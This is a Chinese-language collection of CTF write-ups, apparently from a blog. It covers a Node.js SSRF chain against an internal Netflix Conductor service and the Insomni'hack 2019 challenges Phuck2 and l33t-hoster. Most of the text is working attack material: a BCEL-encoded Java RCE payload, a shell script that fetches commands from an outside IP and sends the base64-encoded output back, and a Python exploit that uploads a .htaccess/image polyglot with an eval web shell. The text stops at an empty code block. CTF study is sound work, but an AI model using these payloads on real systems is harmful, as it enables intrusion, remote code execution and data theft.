post_payload = '[\u{017b}\u{0122}name\u{0122}:\u{0122}$\u{017b}\u{0127}1\u{0127}.getClass().forName(\u{0127}com.sun.org.apache.bcel.internal.util.ClassLoader\u{0127}).newInstance().loadClass(\u{0127}$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$oA$U$3d$d5$m$N$3d$8d$80$K3$f8$g$d4$850$P$ba$3b$99dF4n$8c$ae$f0$R$n$e3$c2$8dM$5b$c1Bh$3aM$81$ce$X$cd$da$Nc$5c$f8$B$7e$d4$e8$ad$8e$R$T$ad$a4N$d5$3d$f7$d4$b9$b7$aa$k$fe$df$dd$D$f8$815$DI$cc$Z$c8$a3$90$c4G$b5$7e$d2Q40$85y$j$L$3a$W$Z$S$5b$c2$Xr$9b$nV$ae$fcf$88$ef$f4$cf9C$a6$$$7c$7e0$ec$b5x$d8t$5b$5db$d2$N$e9z$97$fbn$Q$c5$d1$e9$o$c9$7b$ae$f0$Z$K$e5$d3z$c7$j$b9V$d7$f5$dbVC$86$c2oo$w$3b$a3$d1$l$86$k$df$T$ca$o$b5$3b$S$dd$aa$d2$99H$c1$d0$b1db$Z$9f$Z$be$5d$b5$b9$y$5dH$Z$d4$y$eb$97S$fdiW$j$db$a9n85$c7$b6m$a7$f4$fd$b0d$c9$5e$60$85$c2$bb$fcc$a2$84$V$86$d9I$bd$ddk$8f$HR$f4$7d$T$ab0$a8$vU$87$n$3bQ$i$b6$3a$dc$93$M$b9$Ju$3c$f4$a5$e8QW$G$d5$7e$J$f2$e5J$fd$8df$93$y$f95$f7$Y$d6$cb$ef$5c$f3$Vu$U$f6$3d$3e$Y$d0$81L$40I$Z$bdY3t$3d$8e$V$e8$f4$Xjh$60$ea$fa$84$l$u$3a$a3X$a3$b5$f0$e5$l$d8$z$b4$99$d8$Y$f1$93$bfH$d6$bf$8e$91$b8$nU$iid$e9$cb4$98$a4$9bG$820F$ec$U$f1$v$ca$e8$c8$91s$9e$i$d3$94$c9B$7b$q$60$3a$a6$Vd$e2$91$s$f7$5c$adH$93$a9y$Tm$94a$o$o$d2$843Qs$b3O$G$mj$o$3e$C$A$A\u{0127}).newInstance().class\u{017d}\u{0122},\u{0122}ownerEmail\u{0122}:\u{0122}test@example.org\u{0122},\u{0122}retryCount\u{0122}:\u{0122}3\u{0122},\u{0122}timeoutSeconds\u{0122}:\u{0122}1200\u{0122},\u{0122}inputKeys\u{0122}:[\u{0122}sourceRequestId\u{0122},\u{0122}qcElementType\u{0122}],\u{0122}outputKeys\u{0122}:[\u{0122}state\u{0122},\u{0122}skipped\u{0122},\u{0122}result\u{0122}],\u{0122}timeoutPolicy\u{0122}:\u{0122}TIME_OUT_WF\u{0122},\u{0122}retryLogic\u{0122}:\u{0122}FIXED\u{0122},\u{0122}retryDelaySeconds\u{0122}:\u{0122}600\u{0122},\u{0122}responseTimeoutSeconds\u{0122}:\u{0122}3600\u{0122},\u{0122}concurrentExecLimit\u{0122}:\u{0122}100\u{0122},\u{0122}rateLimitFrequencyInSeconds\u{0122}:\u{0122}60\u{0122},\u{0122}rateLimitPerFrequency\u{0122}:\u{0122}50\u{0122},\u{0122}isolationgroupId\u{0122}:\u{0122}myIsolationGroupId\u{0122}\u{017d}]'
console.log(encodeURI(encodeURI(encodeURI('http://0.0.0.0:3000/\u{0120}HTTP/1.1\u{010D}\u{010A}Host:127.0.0.1:3000\u{010D}\u{010A}\u{010D}\u{010A}POST\u{0120}/search?url=http://10.0.140.9:8080/api/metadata/taskdefs\u{0120}HTTP/1.1\u{010D}\u{010A}Host:127.0.0.1:3000\u{010D}\u{010A}Content-Type:application/json\u{010D}\u{010A}Content-Length:' + post_payload.length + '\u{010D}\u{010A}\u{010D}\u{010A}' + post_payload+ '\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private'))))
```

得到

```
http://0.0.0.0:3000/%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258APOST%2525C4%2525A0/search?url=http://10.0.122.14:8080/api/metadata/taskdefs%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258AContent-Type:application/json%2525C4%25258D%2525C4%25258AContent-Length:1507%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%25255B%2525C5%2525BB%2525C4%2525A2name%2525C4%2525A2:%2525C4%2525A2$%2525C5%2525BB%2525C4%2525A71%2525C4%2525A7.getClass().forName(%2525C4%2525A7com.sun.org.apache.bcel.internal.util.ClassLoader%2525C4%2525A7).newInstance().loadClass(%2525C4%2525A7$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2$40$U$3dS$K$85Z$ET$f0$ad$b8$S_$b4$5d$f9$8c$h$a3$x$7cD$8c$$$dcX$ea$EG$a14uP$fc$o$d7l$d4$b8$f0$D$fc$u$f5$O1b$a2$93$cc$99$b9$e7$9e9$f7$ce$cc$fb$c7$eb$h$80U$cc$99Hb$c8$c40F$92$c8$ab$b5$60$60$d4D$ic$G$c6$NL0$q$b6D$m$e46C$ac$b4p$ca$a0$ef$b4$$9C$a6$o$C$7e$d0n$d6xt$e2$d5$g$c4$a4$ab$d2$f3o$f6$bd$f0$3b$d6$9b$9e$I$Y$K$a5$f3$ca$b5w$e7$d9$N$_$a8$dbU$Z$89$a0$be$a9$8c$ccj$ab$j$f9$7cO$uqj$f7N4$caJg$n$F$d3$c0$a4$85$vL3$y$df$d7$b9$y$5eI$Zn$d8$f6$9a$5b$5eu$ca$ae$e3$96$d7$dd$N$d7q$i$b7$b8rX$b4e3$b4$p$e1$df$3cX$98$c1$y$c3p$bf$den$c7$e7$a1$U$ad$c0B$R$s5$a5$ea0d$fb$8a$c3$da5$f7$rC$aeO$j$b7$D$v$9a$d4$95I$b5$7f$82$7ci$a1$f2G$b3I$96$bc$c3$7d$86$f9$d2$3f$d7$fcE$jE$z$9f$df$de$d2$81LHI$d9$7b$ad$93$c8$f39$e6$60$d0$_$a8$a1$81$a9$eb$T$OPtA$b1Fka$f1$Z$ec$F$daP$ec$J$fa$d9$p$92$95$a5$t$q$ba$a4$d2$91F$96$3eK$83E$ba$J$q$Ic$c4$c6$89OQ$c6$40$8e$9c$f3$e4$98$a6L$W$da$t$B3$88$t$88$eb$a4$ZD$e6$bb$da8M$a6f$b7$b7Q$86$89$k$91$s$cc$f6$9a$cb$7d$B$T$c2pg8$C$A$A%2525C4%2525A7).newInstance().class%2525C5%2525BD%2525C4%2525A2,%2525C4%2525A2ownerEmail%2525C4%2525A2:%2525C4%2525A2test@example.org%2525C4%2525A2,%2525C4%2525A2retryCount%2525C4%2525A2:%2525C4%2525A23%2525C4%2525A2,%2525C4%2525A2timeoutSeconds%2525C4%2525A2:%2525C4%2525A21200%2525C4%2525A2,%2525C4%2525A2inputKeys%2525C4%2525A2:%25255B%2525C4%2525A2sourceRequestId%2525C4%2525A2,%2525C4%2525A2qcElementType%2525C4%2525A2%25255D,%2525C4%2525A2outputKeys%2525C4%2525A2:%25255B%2525C4%2525A2state%2525C4%2525A2,%2525C4%2525A2skipped%2525C4%2525A2,%2525C4%2525A2result%2525C4%2525A2%25255D,%2525C4%2525A2timeoutPolicy%2525C4%2525A2:%2525C4%2525A2TIME_OUT_WF%2525C4%2525A2,%2525C4%2525A2retryLogic%2525C4%2525A2:%2525C4%2525A2FIXED%2525C4%2525A2,%2525C4%2525A2retryDelaySeconds%2525C4%2525A2:%2525C4%2525A2600%2525C4%2525A2,%2525C4%2525A2responseTimeoutSeconds%2525C4%2525A2:%2525C4%2525A23600%2525C4%2525A2,%2525C4%2525A2concurrentExecLimit%2525C4%2525A2:%2525C4%2525A2100%2525C4%2525A2,%2525C4%2525A2rateLimitFrequencyInSeconds%2525C4%2525A2:%2525C4%2525A260%2525C4%2525A2,%2525C4%2525A2rateLimitPerFrequency%2525C4%2525A2:%2525C4%2525A250%2525C4%2525A2,%2525C4%2525A2isolationgroupId%2525C4%2525A2:%2525C4%2525A2myIsolationGroupId%2525C4%2525A2%2525C5%2525BD%25255D%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258AGET%2525C4%2525A0/private
```

启服务

```python
import os
from flask import Flask,redirect
from flask import request


app = Flask(__name__)

@app.route('/')
def hello():
    return open("test1.txt").read()

@app.route('/command')
def hello1():
    return open("command1.txt").read()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10001))
    app.run(host='0.0.0.0', port=port)
```

test1.txt写sh脚本

```
#!/bin/sh
wget -O- -q  http://81.70.101.91:10001/`wget -O- -q http://81.70.101.91:10001/command|sh|base64|awk '{printf("%s",$0)}'` | echo

#!/bin/sh
wget http://81.70.101.91:10001/1?a=`wget -O- http://81.70.101.91:10001/command|sh|base64`
```

command1.txt写执行命令

```
cat /flag
```

下载脚本后执行脚本的class

```
public class Evil
{
    public Evil() {
        try {
            Runtime.getRuntime().exec("sh /tmp/ricky");
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void main(final String[] array) {
    }
}
```

编译

```
javac Evil.java
java -jar BCELCodeman.jar e Evil.class
$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2$40$U$3dS$K$85Z$e4$r$u$f8$C$5d$I$9a$d8$8d$3b$8c$h$a3$x$7cD$88$$$dcX$ea$E$87G$ne$m$f8E$ae$d9$a0q$e1$H$f8Q$ea$9d$c6$88$89N2$e7$ce$3d$f7$cc$b9$f3x$ffx$7d$Dp$80m$TQ$y$99$c8$o$X$c5$b2$8a$x$G$f2$s$c2$u$YX5$b0$c6$Q9$U$9e$90G$M$a1r$e5$9aA$3f$ee$dfs$86DMx$fc$7c$d4kr$bf$e14$bb$c4$c4$eb$d2q$3bg$ce$m$c8$83$ddy$92$f7$i$e11$e4$ca$b7$b5$b63v$ec$ae$e3$b5$ec$ba$f4$85$d7$aa$w$3b$b3$de$l$f9$$$3f$V$ca$ov2$W$dd$7d$a5$b3$Q$83i$60$dd$c2$G6$c9$7b$f8P$b4eo$60$fb$c2$ed$3cZ$u$a2$c4$90$99$h$9eL$5c$3e$90$a2$efY$d8$82I$5d$95$RCr$ae$b8h$b6$b9$x$ZRs$eaj$e4I$d1$a3$b6f$8b$cb$9f$q$5b$ae$d4$feh$aad$c9$t$dce$d8$v$ffs$8f_$d4$a5$dfw$f9pH$h$S$D$w$ca$e0Q$g$be$e3r$94$60$d0c$ab$a1$81$a9$fb$R$$PvG$b9F1$b7$fb$M$f6$C$z$j$9aA$bfyB$b4$b67CdJ$w$jq$q$e9O4X$a4$x$mB$Y$o6L$7c$8c$w$GR$e4$9c$r$c78U$92$d0$3e$J$98$81E$F$J$3d$d0$a4$be$bb$e5i25$a7$c1B$ZF$C$oN$98$O$O$97$f9$C$fe$5e$s$n$l$C$A$A
```

再次拼接然后拿到请求

```
post_payload = '[\u{017b}\u{0122}name\u{0122}:\u{0122}$\u{017b}\u{0127}1\u{0127}.getClass().forName(\u{0127}com.sun.org.apache.bcel.internal.util.ClassLoader\u{0127}).newInstance().loadClass(\u{0127}$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2$40$U$3dS$K$85Z$e4$r$u$f8$C$5d$I$9a$d8$8d$3b$8c$h$a3$x$7cD$88$$$dcX$ea$E$87G$ne$m$f8E$ae$d9$a0q$e1$H$f8Q$ea$9d$c6$88$89N2$e7$ce$3d$f7$cc$b9$f3x$ffx$7d$Dp$80m$TQ$y$99$c8$o$X$c5$b2$8a$x$G$f2$s$c2$u$YX5$b0$c6$Q9$U$9e$90G$M$a1r$e5$9aA$3f$ee$dfs$86DMx$fc$7c$d4kr$bf$e14$bb$c4$c4$eb$d2q$3bg$ce$m$c8$83$ddy$92$f7$i$e11$e4$ca$b7$b5$b63v$ec$ae$e3$b5$ec$ba$f4$85$d7$aa$w$3b$b3$de$l$f9$$$3f$V$ca$ov2$W$dd$7d$a5$b3$Q$83i$60$dd$c2$G6$c9$7b$f8P$b4eo$60$fb$c2$ed$3cZ$u$a2$c4$90$99$h$9eL$5c$3e$90$a2$efY$d8$82I$5d$95$RCr$ae$b8h$b6$b9$x$ZRs$eaj$e4I$d1$a3$b6f$8b$cb$9f$q$5b$ae$d4$feh$aad$c9$t$dce$d8$v$ffs$8f_$d4$a5$dfw$f9pH$h$S$D$w$ca$e0Q$g$be$e3r$94$60$d0c$ab$a1$81$a9$fb$R$$PvG$b9F1$b7$fb$M$f6$C$z$j$9aA$bfyB$b4$b67CdJ$w$jq$q$e9O4X$a4$x$mB$Y$o6L$7c$8c$w$GR$e4$9c$r$c78U$92$d0$3e$J$98$81E$F$J$3d$d0$a4$be$bb$e5i25$a7$c1B$ZF$C$oN$98$O$O$97$f9$C$fe$5e$s$n$l$C$A$A\u{0127}).newInstance().class\u{017d}\u{0122},\u{0122}ownerEmail\u{0122}:\u{0122}test@example.org\u{0122},\u{0122}retryCount\u{0122}:\u{0122}3\u{0122},\u{0122}timeoutSeconds\u{0122}:\u{0122}1200\u{0122},\u{0122}inputKeys\u{0122}:[\u{0122}sourceRequestId\u{0122},\u{0122}qcElementType\u{0122}],\u{0122}outputKeys\u{0122}:[\u{0122}state\u{0122},\u{0122}skipped\u{0122},\u{0122}result\u{0122}],\u{0122}timeoutPolicy\u{0122}:\u{0122}TIME_OUT_WF\u{0122},\u{0122}retryLogic\u{0122}:\u{0122}FIXED\u{0122},\u{0122}retryDelaySeconds\u{0122}:\u{0122}600\u{0122},\u{0122}responseTimeoutSeconds\u{0122}:\u{0122}3600\u{0122},\u{0122}concurrentExecLimit\u{0122}:\u{0122}100\u{0122},\u{0122}rateLimitFrequencyInSeconds\u{0122}:\u{0122}60\u{0122},\u{0122}rateLimitPerFrequency\u{0122}:\u{0122}50\u{0122},\u{0122}isolationgroupId\u{0122}:\u{0122}myIsolationGroupId\u{0122}\u{017d}]'
console.log(encodeURI(encodeURI(encodeURI('http://0.0.0.0:3000/\u{0120}HTTP/1.1\u{010D}\u{010A}Host:127.0.0.1:3000\u{010D}\u{010A}\u{010D}\u{010A}POST\u{0120}/search?url=http://10.0.140.9:8080/api/metadata/taskdefs\u{0120}HTTP/1.1\u{010D}\u{010A}Host:127.0.0.1:3000\u{010D}\u{010A}Content-Type:application/json\u{010D}\u{010A}Content-Length:' + post_payload.length + '\u{010D}\u{010A}\u{010D}\u{010A}' + post_payload+ '\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private'))))
```

得到请求

```
http://0.0.0.0:3000/%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258APOST%2525C4%2525A0/search?url=http://10.0.140.9:8080/api/metadata/taskdefs%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258AContent-Type:application/json%2525C4%25258D%2525C4%25258AContent-Length:1426%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%25255B%2525C5%2525BB%2525C4%2525A2name%2525C4%2525A2:%2525C4%2525A2$%2525C5%2525BB%2525C4%2525A71%2525C4%2525A7.getClass().forName(%2525C4%2525A7com.sun.org.apache.bcel.internal.util.ClassLoader%2525C4%2525A7).newInstance().loadClass(%2525C4%2525A7$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2$40$U$3dS$K$85Z$e4$r$u$f8$C$5d$I$9a$d8$8d$3b$8c$h$a3$x$7cD$88$$$dcX$ea$E$87G$ne$m$f8E$ae$d9$a0q$e1$H$f8Q$ea$9d$c6$88$89N2$e7$ce$3d$f7$cc$b9$f3x$ffx$7d$Dp$80m$TQ$y$99$c8$o$X$c5$b2$8a$x$G$f2$s$c2$u$YX5$b0$c6$Q9$U$9e$90G$M$a1r$e5$9aA$3f$ee$dfs$86DMx$fc$7c$d4kr$bf$e14$bb$c4$c4$eb$d2q$3bg$ce$m$c8$83$ddy$92$f7$i$e11$e4$ca$b7$b5$b63v$ec$ae$e3$b5$ec$ba$f4$85$d7$aa$w$3b$b3$de$l$f9$$$3f$V$ca$ov2$W$dd$7d$a5$b3$Q$83i$60$dd$c2$G6$c9$7b$f8P$b4eo$60$fb$c2$ed$3cZ$u$a2$c4$90$99$h$9eL$5c$3e$90$a2$efY$d8$82I$5d$95$RCr$ae$b8h$b6$b9$x$ZRs$eaj$e4I$d1$a3$b6f$8b$cb$9f$q$5b$ae$d4$feh$aad$c9$t$dce$d8$v$ffs$8f_$d4$a5$dfw$f9pH$h$S$D$w$ca$e0Q$g$be$e3r$94$60$d0c$ab$a1$81$a9$fb$R$$PvG$b9F1$b7$fb$M$f6$C$z$j$9aA$bfyB$b4$b67CdJ$w$jq$q$e9O4X$a4$x$mB$Y$o6L$7c$8c$w$GR$e4$9c$r$c78U$92$d0$3e$J$98$81E$F$J$3d$d0$a4$be$bb$e5i25$a7$c1B$ZF$C$oN$98$O$O$97$f9$C$fe$5e$s$n$l$C$A$A%2525C4%2525A7).newInstance().class%2525C5%2525BD%2525C4%2525A2,%2525C4%2525A2ownerEmail%2525C4%2525A2:%2525C4%2525A2test@example.org%2525C4%2525A2,%2525C4%2525A2retryCount%2525C4%2525A2:%2525C4%2525A23%2525C4%2525A2,%2525C4%2525A2timeoutSeconds%2525C4%2525A2:%2525C4%2525A21200%2525C4%2525A2,%2525C4%2525A2inputKeys%2525C4%2525A2:%25255B%2525C4%2525A2sourceRequestId%2525C4%2525A2,%2525C4%2525A2qcElementType%2525C4%2525A2%25255D,%2525C4%2525A2outputKeys%2525C4%2525A2:%25255B%2525C4%2525A2state%2525C4%2525A2,%2525C4%2525A2skipped%2525C4%2525A2,%2525C4%2525A2result%2525C4%2525A2%25255D,%2525C4%2525A2timeoutPolicy%2525C4%2525A2:%2525C4%2525A2TIME_OUT_WF%2525C4%2525A2,%2525C4%2525A2retryLogic%2525C4%2525A2:%2525C4%2525A2FIXED%2525C4%2525A2,%2525C4%2525A2retryDelaySeconds%2525C4%2525A2:%2525C4%2525A2600%2525C4%2525A2,%2525C4%2525A2responseTimeoutSeconds%2525C4%2525A2:%2525C4%2525A23600%2525C4%2525A2,%2525C4%2525A2concurrentExecLimit%2525C4%2525A2:%2525C4%2525A2100%2525C4%2525A2,%2525C4%2525A2rateLimitFrequencyInSeconds%2525C4%2525A2:%2525C4%2525A260%2525C4%2525A2,%2525C4%2525A2rateLimitPerFrequency%2525C4%2525A2:%2525C4%2525A250%2525C4%2525A2,%2525C4%2525A2isolationgroupId%2525C4%2525A2:%2525C4%2525A2myIsolationGroupId%2525C4%2525A2%2525C5%2525BD%25255D%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258AGET%2525C4%2525A0/private
```

通过 `/proxy?url=` 接上我们的请求然后去访问, 10001端口的web服务负责监听

![20210706144832884](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210706144832884.png)

得到加密的数据然后base64解密即可得到 flag

![20210706144910460](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210706144910460.png)

****

### 总结

- 利用 0.0.0.0，通过 `/proxy` 和 `/search` 接口绕 WAF，访问 `/flag` 拿 hint
- 在 docker 内网段中扫 Netflix Conductor 服务

- [Nodejs8 SSRF](http://www.iricky.ltd/2021/01/27/31.html#Nodejs8_SSRF)这个知识点考了几次, 就是高编码的绕过然后可以在 GET 传参下发送另一个请求
- 找 Netflix Conductor 漏洞，利用一个 1day RCE 构造 payload
- 利用 `/proxy` SSRF 给内网的 Netflix Conductor 执行远程命令，把 flag 打到自己的服务器上 
- 再强调一点, javac 在linux和windows下编译出的效果是不一样的, 本文全程用windows进行java文件的编译

## [Insomni hack teaser 2019] Phuck2

源码

```php
<?php
    stream_wrapper_unregister('php');
    if(isset($_GET['hl'])) highlight_file(__FILE__);

    $mkdir = function($dir) {
        system('mkdir -- '.escapeshellarg($dir));
    };
    $randFolder = bin2hex(random_bytes(16));
    $mkdir('users/'.$randFolder);
    chdir('users/'.$randFolder);

    $userFolder = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
    $userFolder = basename(str_replace(['.','-'],['',''],$userFolder));

    $mkdir($userFolder);
    chdir($userFolder);
    file_put_contents('profile',print_r($_SERVER,true));
    chdir('..');
    $_GET['page']=str_replace('.','',$_GET['page']);
    if(!stripos(file_get_contents($_GET['page']),'<?') && !stripos(file_get_contents($_GET['page']),'php')) {
        include($_GET['page']);
    }

    chdir(__DIR__);
    system('rm -rf users/'.$randFolder);

?>
```

可以发现这题最终需要 `include($_GET['page'])` 包含文件来进行RCE

` stream_wrapper_unregister ` 限制了我们不能用常规的 php 过滤器包含文件

`escapeshellarg` 保证了 system 的安全性

```php
$randFolder = bin2hex(random_bytes(16));
$mkdir('users/'.$randFolder);
chdir('users/'.$randFolder);
```

为了隔离每个用户的, 防止互相干扰, 往下看

```php
$userFolder = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
$userFolder = basename(str_replace(['.','-'],['',''],$userFolder));
```

这两行表示从 `X-FORWARDED-FOR` 去获取数据作为用户的文件夹名 userFolder

```php
file_put_contents('profile',print_r($_SERVER,true));
chdir('..');
$_GET['page']=str_replace('.','',$_GET['page']);
if(!stripos(file_get_contents($_GET['page']),'<?') && !stripos(file_get_contents($_GET['page']),'php')) {
    include($_GET['page']);
}
```

这一块会把所有 HTTP头 和信息写入  `X-FORWARDED-FOR/profile` 里面, 写入的文件不让含有 `<?` 和 `php` , 考的是 **include() 与 file_get_contents() 的Data URI识别** , 类型是 **data:text/vnd-example+xyz;foo=bar;base64,R0lGODdh** 

> file_get_contents 允许使用 data URI，会直接返回后面的内容，很奇怪的是，在 allow_url_include=Off 的情况下，不允许 include data URI 的，但是如果 `data:,XXX` 是一个目录名的话，就会放开限制。

sample

![20210422160610781](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210422160610781.png)

通过这个漏洞可以包含写入的 profile 文件

![20210422161233845](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210422161233845.png)

****

## [Insomni hack teaser 2019] l33t-hoster

F12 /?source 查看源码

源码

```php
<?php
if (isset($_GET["source"])) 
    die(highlight_file(__FILE__));

session_start();

if (!isset($_SESSION["home"])) {
    $_SESSION["home"] = bin2hex(random_bytes(20));
}
$userdir = "images/{$_SESSION["home"]}/";
if (!file_exists($userdir)) {
    mkdir($userdir);
}

$disallowed_ext = array(
    "php",
    "php3",
    "php4",
    "php5",
    "php7",
    "pht",
    "phtm",
    "phtml",
    "phar",
    "phps",
);


if (isset($_POST["upload"])) {
    if ($_FILES['image']['error'] !== UPLOAD_ERR_OK) {
        die("yuuuge fail");
    }

    $tmp_name = $_FILES["image"]["tmp_name"];
    $name = $_FILES["image"]["name"];
    $parts = explode(".", $name);
    $ext = array_pop($parts);

    if (empty($parts[0])) {
        array_shift($parts);
    }

    if (count($parts) === 0) {
        die("lol filename is empty");
    }

    if (in_array($ext, $disallowed_ext, TRUE)) {
        die("lol nice try, but im not stupid dude...");
    }

    $image = file_get_contents($tmp_name);
    if (mb_strpos($image, "<?") !== FALSE) {
        die("why would you need php in a pic.....");
    }

    if (!exif_imagetype($tmp_name)) {
        die("not an image.");
    }

    $image_size = getimagesize($tmp_name);
    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {
        die("lol noob, your pic is not l33t enough");
    }

    $name = implode(".", $parts);
    move_uploaded_file($tmp_name, $userdir . $name . "." . $ext);
}

echo "<h3>Your <a href=$userdir>files</a>:</h3><ul>";
foreach(glob($userdir . "*") as $file) {
    echo "<li><a href='$file'>$file</a></li>";
}
echo "</ul>";

?>
```

上传文件有以下几个限制:

- 上传的文件不能有PHP扩展名（`.php`，`.php3`，`.phar`，...）
- 上传的文件不能包含 `<?`
- 上传的文件必须是大小为 1337*1337 的有效图像

上传 **.htaccess** 文件可以解决这个问题，但是由于图像限制，我们需要找到一种方法来创建有效的 **.htaccess/image **多语意文件

### 寻找 .htaccess/image 多语意文件

每个图像文件格式都以一些魔术字节开头，以此来定义自身类型。例如，PNG将以4个字节 `\x89PNG` 开头。由于 `\x89PNG` 不是有效的 .htaccess 指令，因此我们无法将PNG文件格式用于我们的多语意文件中。

因此，我首先尝试寻找一个签名开头带有 `#` 符号的文件格式。由于 `#` 符号被解释为.htaccess文件中的注释，因此将忽略图像数据的其余部分，从而生成有效的.htaccess/image多语意文件。

但是没有以 `#` 开头的图像文件格式。但是 .htaccess 文件也会忽略以空字节（`\x00`）开头的行，这和注释（`#`）一样。

查看 `exif_imagetype()` 支持的图像类型，可以下载每种类型的样本并寻找以空字节开头的签名。  

> **exif_imagetype()** 读取一个图像的第一个字节并检查其签名。 

| 版本  | 说明                                   |
| :---- | :------------------------------------- |
| 4.3.2 | 支持 JPC，JP2，JPX，JB2，XBM 以及 WBMP |
| 4.3.0 | 支持 SWC                               |

 **图像类型常量**

| 值   | 常量                                         |
| :--- | :------------------------------------------- |
| 1    | **`IMAGETYPE_GIF`**                          |
| 2    | **`IMAGETYPE_JPEG`**                         |
| 3    | **`IMAGETYPE_PNG`**                          |
| 4    | **`IMAGETYPE_SWF`**                          |
| 5    | **`IMAGETYPE_PSD`**                          |
| 6    | **`IMAGETYPE_BMP`**                          |
| 7    | **`IMAGETYPE_TIFF_II`**（Intel 字节顺序）    |
| 8    | **`IMAGETYPE_TIFF_MM`**（Motorola 字节顺序） |
| 9    | **`IMAGETYPE_JPC`**                          |
| 10   | **`IMAGETYPE_JP2`**                          |
| 11   | **`IMAGETYPE_JPX`**                          |
| 12   | **`IMAGETYPE_JB2`**                          |
| 13   | **`IMAGETYPE_SWC`**                          |
| 14   | **`IMAGETYPE_IFF`**                          |
| 15   | **`IMAGETYPE_WBMP`**                         |
| 16   | **`IMAGETYPE_XBM`**                          |

`.wbmp` 文件适合使用：

[wbmp 转换文件](https://cn.office-converter.com/free-wbmp-converter)

```sh
$ xxd test.wbmp | head
00000000: 0000 8146 810e ffff ffff ffff ffff ffff  ...F............
00000010: ffff ffff ffff ffff ffff ffff ffff fcff  ................
00000020: ffff ffff ffff ffff ffff ffff 03ff ffff  ................
00000030: ffff ffff ffff fffc ffff ffff ffff ffff  ................
```

### 创建 .htaccess/image 多语意文件

创建一个 .htaccess.image 多语意文件

```php
<?php

error_reporting(0);

$contents = file_get_contents("../payloads/original.wbmp");
$i = 0;
while (true) {
  $truncated = substr($contents, 0, $i);
  file_put_contents("truncated.wbmp", $truncated);
  if (exif_imagetype("truncated.wbmp")) break;

  $i += 1;
}

echo "Shortest file size : $i\n";

var_dump(exif_imagetype("truncated.wbmp"));
var_dump(getimagesize("truncated.wbmp"));
?>
```

输出结果为

```php
$ php solution.php && xxd truncated.wbmp
Shortest file size : 6
int(15)
array(5) {
  [0]=>
  int(1200)
  [1]=>
  int(800)
  [2]=>
  int(15)
  [3]=>
  string(25) "width="1200" height="800""
  ["mime"]=>
  string(18) "image/vnd.wap.wbmp"
 }

00000000: 0000 8930 8620           
```

定义一个有效的 `.wbmp` 文件只需要6个字节，我们可以假设宽度和高度在第3至第6字节存储。通过hex editor，你可以修改这些字节来得到1337x1337的大小 

```sh
$ xxd truncated.wbmp
00000000: 0000 8a39 8a39                           ...9.9
```

### 找到php代码执行方法

既然可以上传.htaccess文件，下一步就是找到代码执行的方式。由于`被过滤，不能简单地上传PHP脚本并让它执行。

`php_value`是 .htaccess 文件中可以用的指令之一。该指令允许我们使用`PHP_INI_PERDIR`标志修改[此处列表](http://php.net/manual/en/ini.list.php)里的任何设置。

在这些设置中，有个 `auto_append_file` ，它允许我们在请求PHP文件时添加或包含一个文件。后来发现，`auto_append_file` 还允许各种包装器，如`php://`。

上传一个.htaccess文件，设置扩展名为`.ricky`的文件当做PHP执行，并在最后添加 `php://filter/convert.base64-encode/resource=shell.ricky`

脚本如下

```python
#!/usr/bin/env python3
# -*-coding:utf-8-*-

import requests
import base64

VALID_WBMP = b"\x00\x00\x8a\x39\x8a\x39\x0a"
URL = "http://38f0cae3-850b-4ce3-b8ab-7f368b745941.node3.buuoj.cn/"
RANDOM_DIRECTORY = "4b908db0cb4511f942feb821a226ba66c216daad"  # 上传后刷新查到目录再进行修改

COOKIES = {
    "PHPSESSID": "e2s5o4f9dud4rjesdovgmgf877"}

def upload_content(name, content):

    data = {
        "image" : (name, content, 'image/png'),
        "upload" : (None, "Submit Query", None)
    }

    response = requests.post(URL, files=data, cookies=COOKIES)

HT_ACCESS = VALID_WBMP + b"""
AddType application/x-httpd-php .ricky
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.ricky"
"""
TARGET_FILE = VALID_WBMP + b"AA" + base64.b64encode(b"""
<?php
  eval($_POST[ricky]);
?>
""")

upload_content("..htaccess", HT_ACCESS)
upload_content("shell.ricky", TARGET_FILE)
upload_content("trigger.ricky", VALID_WBMP)


response = requests.post(URL + "/images/" + RANDOM_DIRECTORY + "/trigger.ricky")
print(response.text)
```

上传木马后蚁剑链接用 `PHP7_GC_UAF` 即可命令执行, 发现执行 /get_flag 有个验证码(此处为[参考](https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/exploit.pl))

```c
